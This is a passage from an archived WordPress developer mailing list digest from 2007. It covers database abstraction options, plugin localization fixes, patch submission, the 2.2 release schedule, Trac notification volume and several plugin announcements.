quotes for strings everywhere, as these syntaxes are both
MySQL-special. There are some other simple rules to be followed, but
in general, it's sticking to ANSI syntax wherever possible.

I'm mostly talking to myself here as I haven't really followed this thread
or stared into the black, black eyes of wp-db.php, but YOU brought up data
abstraction layers again.  And IF we were to consider putting in a complete
data abstraction layer beyond what we already have (and I don't think that's
really what you were saying), I think ADOdb offers a more proven track
record with large open source projects (such as ACID, PostNuke, Xaraya,
phpWiki, Mambo, PHP GACL, TikiWiki, eGroupWare and phpLens App Server) than
what MDB2 has.  

ADOdb:  http://en.wikipedia.org/wiki/ADOdb  http://adodb.sourceforge.net/

However, I've not used MDB2 with anything yet either.  So, perhaps I'm not a
fair judge.  

Still the benchmarks do show that ADOdb has significantly better performance
than MDB:

<SNIP>
Benchmark was to select 82 rows from the products table 200 times.
The tests were repeated 5 times. Connection times were excluded
from the benchmark. Lower values are better. All numbers are in

Plus, while ADOdb does provide support for PostgreSQL, I'm biased to it
because I have a client that wants their WordPress system to be moved over
to Interbase.  So, I'd love to see some progress made on that front, as just
I might end up canoeing that creek all by my lonesome self, with or without
a paddle.  (Of course a non-core side project wouldn't have to deal with all
the broken plugins...)

If we were to do a SOC thing and have someone paid $4.5 grand for three
months of work (or whatever it is), putting in a layer that allowed WP to
run on 18 different database systems would be a much more appropriate and
universal project.  

Of course, any project of this size would require buy in from a number of
mentors and should involve a high level of communication with the plugin
community.

We do thousands of preg operations on every page load. There are going 
to be 10-30 queries on a page, so 10-30 pregs isn't going to make any 
perceptible difference.

What you just described sounds like a one-off implementation of MU, so 
I'd recommend adapting your system to work with MU as that's a much more 
mature and maintained base.

That's what I was thinking..
This would be a minimally-invasive and rather compatible method of pulling it off, esp. if we're looking to not mess up tens of thousands of plugins and bite off more than we can chew.

The only concern is that PREG is naturally a _regular_ expression tool, I'm not sure if SQL queries are actually to be considered "regular" or not.
However, even if PREG is out of the question, you can still easily (and lightly) create a balanced parser, though that would be several hundred times easier in another language :P

that's true but if you have n different files for n different
databases, then you have
n files to mantain when a query changes, and possible n sources of errors

doing queries on the fly doesn't take  too much time and the benefits
are great, and
a lot of the queries are doing on the fly rigth now

for example i picked a random SELECT


$dupe = $wpdb->get_results("SELECT * FROM $wpdb->comments WHERE
comment_post_ID = '$comment_post_ID' AND comment_author_url =
'$comment_author_url'");

it has two variables on it, so is doing on the fly.....  ;)

Or we could just make a wp_query($sql) that uses the appropriate 
database functions and write all of our queries using ANSI SQL. Yea! 
ANSI SQL FTW!

My suggestion was merely to highlight what I think has the most chance 
of actually making a difference.

A boil the ocean approach of getting all of core WP, and every plugin, 
and some themes, to rewrite the way they do things is going uphill every 
step of the way.

A regex filter-based approach might not work for every edge case in the 
world, but I bet you could get it 100% for core and 95%+ for plugins 
without requiring either to change one line of code, and at the end 
you'll have something fairly interesting that could be easily used for 
other applications.

I'm not suggesting it's cleaner, in fact it's a hack, but it has the 
potential to be an elegant hack, which is often more fun.

Subject: [wp-hackers] On Database Abstraction, Agnosticism, etc.
Message-ID: <a491f91d0703232105j572a94a0nf41ab27d73060ebf@mail.gmail.com>

Because I feel like I have been repeating myself and others /a lot/
lately on threads about porting WordPress to xxxx-database for
xxxx-reason, here's a thread on my take on methods and such for
porting WordPress or transforming it to work with another database or
whatever.

1). WordPress's concept of time will need to be rewritten for almost
all alternate databases. Just keep this in mind.

2). True database abstraction stands almost no chance whatsoever,
especially most established packages.

PearDB, Adodb, etc, are all exceedingly slow. They would definitely
allow true database abstraction, for any database to be dropped in,
but they are simply slow, slow, slow. And bulky. They stand almost no
chance at all of ever making it into the WordPress-core, and my bet is
that you will never convince anyone to change their mind.

Now, there are very simple ways for abstraction that might stand a
chance. Some people have suggested just some simple select and insert
functions. This could work, but it comes at a price, a price that is
difficult. It comes at the cost of losing support for using SQL
functions in the queries, especially since many would be database
specific. Basically, it may cost us convenience and speed in some
places. It'd be a hit, but it wouldn't be quite as hard to convince
everyone that it is a worthy trade, if a sufficient system could be
built.

3). Myth: Plugins that use their own SQL can't work with a port.

http://www.orablog.org/ is living proof of the opposite.

4). wp-content/db.php

A very, very simple way of completely replacing the database access
layer. It could be used to provide a translation table for queries,
maybe for plugins as well. It could also do any sort of regexps to
transform queries for use with another database too, or really
anything else.

I have more, but I'm tired and still have the flu.

At Pixline we are going into the same way in our actual project, and  
after a lot of tries to build our system upon WP, we also switched to  
WPMU as the main codebase. I also think that WPMU is the way to go  
for the implementation you describe.

Actually we are working on a group of plugins, themes and widgets  
that will allow to use WPMU as a multisite CMS, with some features  
that actually have really few things blog-oriented. For example, one  
of our subproject is a sort of clone of the WP sidebar widget  
feature, but applied to the main loop; combined with a compatible  
theme, it will allow to build really complex layouts for the home  
page, with ease. (wp has a plugin system called canvas [1] that make  
something similar, but we need something different and WPMU based)

We'd love to release a public alpha of our codebase soon, around the  
half of April. I hope your needs will match our code ;-)

Message-ID: <46065DED.3040009@yellowswordfish.com>

Good day all

Could anyone advise on a problem I am seeing translating a plugin to a 
different language - in this case French. Everything seems to have gone 
correctly except... Any single word strings are displaying correctly in 
French. Multiple word strings are still displaying in English.

For the record and as background: I used poEdit to parse the plugin 
files to get the 'po' file. A helpful French lady then used poEdit to 
key in the translations and save as the 'mo' file. poEdit does not allow 
her to change the original so they are intact. I have placed the 
load_plugin_domain() call in both the main 'admin' and 'public' files 
and the 'mo' file IS getting picked up. Just ignoring anything with 
spaces - i.e. multi-word strings?

Can anyone offer a solution please?
Thanks
Andy

The po file seems to be ok at first glance. Maybe you could upload the
plugin, too. Then it would be possible to see the whole thing in action,
and maybe try a couple of things.

Ok, the problem is, as far as I see, that you do not provide the
textdomain to use to the WP function __(). For example, you have the
code

__("Forum Locked")

but when you use the textdomain "simple-forum", it should read

__("Forum Locked", "simple-forum")

You mentioned that some words actually were translated, I assume they
are words that are contained in the global language file (e.g. "Posts").

By the way, in your beta, the filename is simple-forum-FR_fr.mo, while
it should read simple-forum-fr_FR.mo as this is the correct and usual
locale token. And, you should use the API hook "init" for loading the
textdomain, because this ensures that multilinguality plugins such as
Polyglot will choose the correct language.

A million thanks Alex
There is conflicting advice on the codex regarding the __() format. One 
said you required the text domain the other did not include it and I 
thought the one without was the more recent article so I used that. I 
will add that in... 419 times! and also do the other tasks you have 
given me.
I am very grateful for this help. I will inform the young lady in France 
she can finish the task!

Andy

You can use Komodo or GREP to add it in with a regex replacement search....
make things easier :)

yes of course.
The one WITH the parameter:

http://codex.wordpress.org/Writing_a_Plugin#Localizing_Plugins

And the one without:

http://codex.wordpress.org/Localizing_WordPress

with the first one of these seeming to be the correct format.

This article probably refers to using __() with default WP translation.

thank you, but I had already received all their mails, in the correct 
order. I can take a top post or two, or a reply to a digest that breaks 
the thread, but top post to a digest of 9 emails...

Sorry Alex, can I double-check what I have done here because I'm still 
not getting anything. In fact, in the admin side I'm not even getting 
the 'cancels', 'edits' etc., any more!

(Renamed and rebuilt the mo by the way - shorter name, less bytes).

(1) My config.php is set to: 'WPLANG', 'fr_FR' - and I am getting WP in 
French.

(2) I have put the load textdomain into an 'init' action as you advised:

    add_action('init', 'sf_localisation');

    function sf_localisation()
    {
        load_plugin_textdomain('sforum',
    ABSPATH.'wp-content/plugins/simple-forum/languages/sforum-'.get_locale().'.mo');
    //    load_plugin_textdomain('sforum',
    ABSPATH.'/wp-content/plugins/simple-forum/languages/');
    }

I've seen this done with both formats above in other plugins (although 
never, interestingly, in  an 'init') so I have tried with both.

(3) I have changed the __( and _e( calls to the format __("Locked", 
"sforum")

(4) My newly compiled .mo file is now named 'sforum-fr_FR.mo'

.... and... nothing?

Can you spot what I may have missed please?

regards
Andy

Try this one:

function sf_localisation() {
	global $locale;
	load_plugin_textdomain('sforum', '/wp-content/plugins/simple-forum/languages/');
}

This method works very well for my plugins.

Btw,

after looking at the source, it looks like the correct thing to call is

load_plugin_textdomain('sforum', 
'wp-content/plugins/simple-forum/languages')

(wp-includes/l10n.php)

> (3) I have changed the __( and _e( calls to the format __("Locked", 
> "sforum")

the source of your confusion seems to be the definition of __(): 
__($text, $domain="default") :)

> (4) My newly compiled .mo file is now named 'sforum-fr_FR.mo'

this appears to be the correct name, not FR_fr  ;-)

Yes.. .when your email came in  I was just looking at the source for 
load_plugin_textdomain and seeing the problem. Strange, as I pulled the 
original I had from a couple of other plugins but thinking about it.. 
they are both rather old (VERY old on e of them!) - and I use neither of 
them. So maybe the call has changed.

This seems to have licked it anyway. I am grateful to you and to Sabin 
as well for the help. And thanks for your patience... I'm getting too 
old for this!

regards
Andy

We finally have a running alpha out of the box, and would like some  
feedback and brainstorming on it, while working on the other part of  
our system.

It's like sidebar widgets for the loop, reuse main part of the  
sidebar code (actually cloning it, but we are working on a wrapper),  
use the same design api for themes and widgets, just play *inside* or  
*instead* the loop, and features a light interface prototype in  
jquery (with awful colors bundled ;-).

If anyone is tempted and wants to check it out please download from:

http://pixline.net/wphackers/postwidgets.zip

and share your doubts or your happiness (and maybe your code as  
well ;-).
We'll start tomorrow working on the two sets of widgets, one for  
wordpress and one for wpmu. Actually you can convert quite any widget  
to a postwidget simply swapping every 'sidebar' reference (function  
names and so on) into 'mainbar' (that was the codename, will soon  
change.).

Regards,
Paolo

Message-ID: <86ed8fe60703261225n3c82d72ct931bc457e0b03eb3@mail.gmail.com>

Hi guys,

Just joined the list, this is my first post. And my first attempt at a patch
to any open source project so i've probably made some big mistakes, but here
goes.

I wanted to allow unixtimes to be used in permalinks (to reproduce my
current blog software), so I asked on the support forum and then figured
"what the hell, i'll give it a go anyway".

Attached is a patch for 2.1.2 which adds this support (you can use
%unixtime% in permalink URLs) this hasn't been tested, and is the first time
i've ever looked through the wordpress codebase so if i've missed something,
I appologise.

Hope someone finds it useful. Do with what you will.

I'm afraid, your patch got lost, as this list doesn't accept
attachments. (I actually wonder how your mail came through at all.)

Maybe you could upload the patch and provide the link.

Ohh. I see. I'm off to a great start as per usual then.

It looks like your patch is reversed ;-)

Out of curiosity what is your current blog software?

Actually, I believe it just strips non-text attachments. So, mostly, .txt.

I have tried posting GPG-signed messages to this list and didn't even
get a bounce, the mails were just dropped. (My mail program sends signed
messages as attachments, not inline as others do.) I took me quite some
time to figure that out. Since then, I don't sign my messages to this
list, and everything goes smooth. However, your explaination makes
sense, too... especially regarding David's message with the formerly
attached patch.

Alex

I saw this this morning on Bugtraq. I don't feel that this is a bug  
of WordPress. The cause of the error may be a bug, but the fact that  
the path is displayed is not a flaw of WordPress. It will happen in  
any code on any platform that doesn't have display_errors off in  
php.ini and is not specific to WordPress. Systems folks should be  
addressing the vulnerability as a system configuration error - not  
WordPress.

That said, whatever the error is that caused the error display may  
have to be addressed.

Message-ID: <70ebb7140703261647y41a53855wbeab30925ec04250@mail.gmail.com>

The target release date for WordPress 2.2 is less than a month away, April 23rd.

I am bumping non-severe tickets out of 2.2 .
If it has a patch, I am bumping it to 2.3 .
If it does not, I am bumping it to 2.4 .

If I bump something, feel free to champion that ticket getting into
2.2. Express in the ticket why the issue is more severe than the
ticket currently reflects. Confirm that the problem still exists on
trunk. Confirm the repro. steps are succinct. Identify related issues
and work-arounds. Look to Matt, Ryan, MarkJaquith, Rob1n, etc
for leadership in the tickets.

Thank you!

I agree -- hardly a bug, but it might be a good idea to add some checking to
see if the user isn't loading the file directly. Perhaps an IN_WP constant?

I agree too, i use a little code for my theme and my plugins that
validates the execution from wordpress and not outside him...

if(!defined("ABSPATH"))
{
 	die();
}

Grettings from mexico...

Err. "Whoops". I've updated the file, sorry!

Out of curiosity what is your current blog software?


It's just some home grown app written in perl.

I am making sort of the same functionality for WPMU. I know WPMU has some 
support for multiple sites, but the sites should have different users 
database and might later get other differences. One think was clear, it must 
be running from the same code.

The solution I went for was to define a directory to hold all my site specific 
configurations as well as a global one (i.e. one database, but different 
table prefixes). The configuration file used when loading WordPress is based 
on the name of the site. In my situation that was the first part/directory of 
the URL (i.e. http://www.example.com/foo/blog/ tells me to use the config 
file wpmu-site-foo.php).

Since I was using MU I needed to make a new directory structure for keeping 
the users uploaded files. Since the blog ID's start all over for each site, i 
needed to separete the upload directories 
(i.e. /wp-content/uploads/foo/blogs.dir/...)

There was very little documentation about this sort of things, but 
http://codex.wordpress.org/Installing_Multiple_Blogs is a start.

Remember... multisite is nothing more than a new dimension to the 
multiblog-concept of MU.

Subject: [wp-hackers] ways to set flags for an options page
Message-ID: <4608EB8B.4010708@m0n5t3r.info>

Hello
I am trying to have a message like the one saying "options updated" 
appear when a script called from an options page does something (i.e. 
click link, script does its job, then calls wp_redirect to go back).
Now,  if I use a query string parameter, things work, but if the user 
then modifies some options and clicks "update options", the parameter 
previously attached doesn't get stripped, and the user ends up with 2 
informational fading boxes (which is ugly), one of which is outdated 
(which is confusing).
I tried setting a session variable, but it looks like Wordpress doesn't 
use PHP sessions. Is there a reason I should avoid them (i.e. are they 
causing problems with some hosts/other web servers than apache)? And if 
so, what would be the alternatives, other than set_option("stuff_done", 
true)?

Hello team - I've written here before but I'll reintroduce myself  
since I've recently acquired the Mac weblog editor, MarsEdit:

http://www.red-sweater.com/marsedit/

 From time to time I have questions or concerns about how the remote  
editing APIs in WordPress will evolve. I'd love to be in touch with  
anybody from the team who considers themselves actively engaged in  
work on either the xmlrpc or Atom-based publishing interfaces.

Check ya later!

I read it, but it is an extreme edge case -- it is fantastic that you
have reviewed ever Idea!

Perhaps this is a silly question but I'm new to submitting bugs and
fixes to WordPress and keep seeing my patches getting bumped so I'm
probably doing something wrong :-)

What's the process for getting patches for non-severe issues into
WordPress? I've got three tickets open, with patches, for some minor
issues I've come across with the default theme (#3779, #3923, #3977).
Should I be using the needs-testing keyword or dev-feedback?

Thanks,

James

Not a silly question at all.

I looked through your bug reports and they are well written. Thank you!

That is the nature of non-severe issues. Keep the ticket and the patch
fresh, come to bug hunts, ask questions on #wordpress-dev. For
non-trivial fixes, commenting in the ticket how you tested it also
helps.

Thank you,

Heh - free MarsEdit to the person who adopts xmlrpc.php and makes  
"newMediaObject" respect the "folder" parameter in a more meaningful  
way :)

A challenge!  *chuckle*

Don't we have some XML-RPC code being worked on under the SoC?

Westi seems to be one of the passionate contributers to this area, but
this list is the best place to voice your questions and concerns. We
gladly accept tickets (trac.wordpress.org) with patches  ;-) (As some
other blog editor client authors generously find a little time to
contribute directly.)

I would highly suggest to take a look at all of the new APIs we've added 
over the last few months, worked on by Joseph Scott:

Thanks, Matt. Of course... my memory is so bad :) I should have known  
to look in the Trac database to get a renewed sense for what was  
going on. Awesome work, Joseph.

In fact, I even submitted a patch of my own a few weeks ago:

http://trac.wordpress.org/ticket/3981

Which was thankfully integrated :) Especially happy to see that the  
change was integrated for 2.1.3.

Anyway just planting the seed - I'm around and happy to talk  
"protocol" with anybody who thinks I can help with anything. Looking  
forward to seeing the numerous improvemements in xmlrpc.php go live  
in 2.2!

I'm not sure if it's possible (maybe an addition of a filter) but you can
always add a rewrite tag. I'm not sure this is really that practical (UNIX
time stamps aren't the easiest to comprehend).

actually, I haven't; there are lots of ideas I've read that I'm pretty 
sure I haven't voted for (and opening them confirms it), yet they don't 
appear in the "ideas you haven't reviewed"; also, when adding an idea, I 
am instructed to separate tags by spaces, but all the text I entered was 
taken as a single tag; I tried deleting it, and it didn't work (Firebug 
reported no javascript errors, so it must be something on the other side).

Oh interesting. I may have misread your report. I will investigate further.

Actually, I was being genuine. Unless, I am thinking of someone else,
but if I recall correctly since the beginning of the year you have
made a number of contributions to WordPress' bug tracker. Yes,
confirmed now, I recall correctly, m0n5t3r is you correct?

The very best to you,

I must apologize then for misunderstanding; since my patches were 
apparently not important, "awesome" sounded very sarcastic to me :P

I guess I am easily excited ;-) Putting your work out there is more
than most people do, and once it it out there who knows who you will
help. You tickets demonstrate your attention to detail, and good
patches generally stay good patches.

Can we get some warning or something before another trac flood like
we've been under? Keeping the trac mails in my inbox has had me
suffering trying to find anything else in my mail today, so it'd be
nice to at least have some warning or something to temporarily have
them automatically moved to a folder or something.

Why not just filter them all to a separate folder continuously?

Because its nice to be able to read them when they're coming in at a
sane pace. 4-5 a minute though is a bit overboard. Even now this
thread has been knocked down quite a few spots in my inbox.

Sorry about that. I will try to keep that in mind next time and
provide at least a day's notice.

My eyes are bursting out of my head from skimming all of these
tickets. Almost done, and then I will leave it to you knowledgeable
developers to tune it up.

The Trac mailer did just what it was intended to do, which is to
inform about changes. As others have said, separating boxes is the key
here, then 'polling' to see the changes.

Message-ID: <20070328090549.1cc1497a@mail.lttd.net>

Hi Guys,

I'm currently working on an Event Viewer Plugin for Wordpress.

The idea is that events such as users added, password reseting etc are logged.

At this stage the plugin works but it doesn't log anything.

I'm interested to see if anyone might use it, or has any suggestions.

The very very alpha version can be downloaded here (tested on Wordpress 2.1.2):
http://download.bluetrait.org/btev/btev-0.1.zip

The plugin installs to:
Manage -> Event Viewer

Thanks,
Michael.

MIchael,
I love the concept and I think it would be really useful, especially for
mutiuser blogs. I also like Jeremy's idea of having the link in a couple of
places.
Please let me know if you need any help,
(And since I am more of a lurker recently, that goes for everyone on this
list, BTW)

Thanks,
Mark

All I did was make a request that we be warned. He has no need to
listen, he could have very well said no himself, but some people
aren't so bloody heartless. I apologize for trying to streamline my
time spent contributing.

Thank you Lloyd for taking a second to consider others.

For another idea, how about instead of giving us a warning or
something, could somebody reconfigure the trac mailer not to send on
frivolous changes that the whole list doesn't need to know about. It
would be nice to know about comments, tickets being
created/closed/reopened, but not so much to know about every time
someone changes the milestone or the version.

It depends. For tickets I submitted or made patches for, I'd also like to
get those milestone or version change notifications. And other people might
also want them under different circumstances.

The only option that will please all people is (if Lloyd (or anybody else
doing mass trac triage) is willing) to notify people in advance, so they can
temporarily switch to digest mode if they don't want to get a large amount
of trac mails.

But the default should definitely be: mail everything, because that's what
the list is for.

Greetings,
Bas Bosman (Nazgul)

Then you should put yourself on the cc list, which should update on
every little change for the ticket. The whole list doesn't need to see
milestone changes for 200 tickets at a time, though.

I disagree, in the same way that the Trac timeline doesn't display
everything, I don't think the list should either. I think the mailing
list should display more than the timeline even, but neither need to
show every little itty bitty change, unless you are CCed to a specific
ticket, its creator, etc.

By the way, regarding the CC list, I do not want to put my email list 
in a field that gets displayed to the world on a web site (spam 
magnet), but just entering my Trac user name doesn't seem to get me 
cc'd (even though my email address is in my forum profile, at least it 
was last time I checked into this).

So I never bother putting myself into CC. Is this supposed to work 
with just your user name?

I didn't think so.

But here is what to do:

  1. Log into Trac.
  2. Go to your settings page.
  3. Setup Realname and email address.
  4. Add yourself to cc.
  5. Receive emails when those tickets change.

Hope this helps.

Ah. The issue is that you have to enter a profile in Trac, even if you 
have it set up in the Forums (which is where you go to make a user 
name). That's confusing. I'll make sure the Codex reflects it...

Thanks,
     Jennifer

I didn't mean to have it in multiple places, sorry. I mean to _remove_

most stats plugins place themselves.

We're now targeting April 2nd for release.  I'm going to do another
round of auditing and then package RC3 tomorrow.  I think we shook out
all of the bugs from our last big security patch, but more testing is
always welcome.

Yes, this is rather annoying when you're posting code to a WP Blog that
doesn't allow Registration and you forget to replace <'s and >'s. Then your
code doesn't show up...

This should be submitted to Trac (http://trac.wordpress.org), by the way, if
it hasn't already.

You guys have been great about increasing the awareness and improving
the transparency of these last few releases.  As one out here in the
community, I just want to say "Thank You!" and "Well done!".

I didn't mean to have it in multiple places, sorry. I mean to _remove_
  it from the Manage menu and place it in the Dashboard menu, like where
  most stats plugins place themselves.I'm going to stick it under the Dashboard only, for the time being. But I plan on having some options so you can move it around.

There is also the Recent Events that sit under the site stats on the front page; again this can be turned off.

Hi,
I want to show menus which include pages marked as private IF a user is 
logged in.
I tried overriding, but that does not work
e.g. 
wp_list_pages('title_li=<h2>'.__('Fleets').'</h2>&child_of=13&post_status=')
The get_pages() code seems to be hard-coded to post_status='publish'.

Can you recommend a way to do this?
Thanks
Chris

You can grab the page as post... then check with is_page() to do anything
you might want to modify - unless I'm understanding you the wrong way.

Pages are supposed to be static, so I guess they're not checked as much. But
the only difference between a post and a page is in the way they're
displayed in the theme (and categories and stuff, but that's really beyond
the point).

Okay there is a new version out (0.2)

Has a few changes:

1) Date is filled in for an event
2) Update checker
3) More events tracked

You can download it from here:
http://download.bluetrait.org/btev/latest.zip

If you're running 0.1 you should delete the two tables it installed:
$wpdb->prefix . 'btev_events';
$wpdb->prefix . 'btev_site';

Future versions will have an update script.

Michael.

Subject: [wp-hackers] [RFC] some admin hooks
Message-ID: <460BFCDA.6030209@m0n5t3r.info>

Hello

I would like to propose some hooks for the plugin management interface:
 * action get_plugin_data: it would allow plugging in additional code 
for managing info like dependencies, update URL, etc...
 * action before_activate_$plugin: it would allow plugins to check for 
needed features before activation and set a flag to skip activation if 
dependencies are not met

and, maybe
 * filter (or action?) plugins_header (to add columns to the table)
 * filter (or action?) plugin_rows (similar to cat_rows?)

also, get_plugins() looks like it needs some cleaning

what'ya think? should I do it and post a patch?

Thanks Guru,
yes, is_page tells me it's a  page, but not the page status. (I want to 
show pages on the menu system if a user is logged in (not not if they 
are not logged in).
The problem is I cannot retrieve private pages, only published pages.
The reason i want to do this is I want to show published pages all the 
time (i.e. as any normal blog would), but only show private pages when a 
user is logged in. I can't find a way to retrieve private pages with 
this function, for reason given below.
Thanks
Chris

Check my post levels plugin (

up private pages (and posts)

Hey Filipe - Looks a good possibility.. I am already using these plugins:
 ec3Calendar,
Page Category Organiser,
Role Manager
as I am designing this site for a club which will have several editors etc.
So keen to try your plugin, which sounds great - does it work with 
these, do you know?
Thanks, Chris
